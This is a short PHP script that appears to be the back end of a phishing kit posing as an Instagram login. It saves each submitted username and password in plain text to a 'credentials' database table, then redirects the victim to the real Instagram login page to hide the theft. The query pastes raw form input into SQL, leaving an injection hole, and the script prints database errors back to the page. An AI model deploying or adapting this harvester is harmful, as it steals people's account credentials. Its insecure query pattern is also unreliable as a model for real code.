<?php
session_start();
ob_start();
$host="localhost";
$username="testuser";
$pass="testpassword";
$dbname="testing";
$tbl_name="credentials";

// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
if ($conn) {
    $oldpassword=$_POST['username'];
	$newpassword=$_POST['password'];

	$sql = "INSERT INTO credentials (username, password) VALUES ('$oldpassword', '$newpassword')";
	if (mysqli_query($conn, $sql)) {
        	echo "New record created successfully";
	} else {
    		echo "Error: " . $sql . "<br>" . mysqli_error($conn);
	}

	mysqli_close($conn);
}

sleep(2);
header("location:https://instagram.com/login");
ob_end_flush();
?>
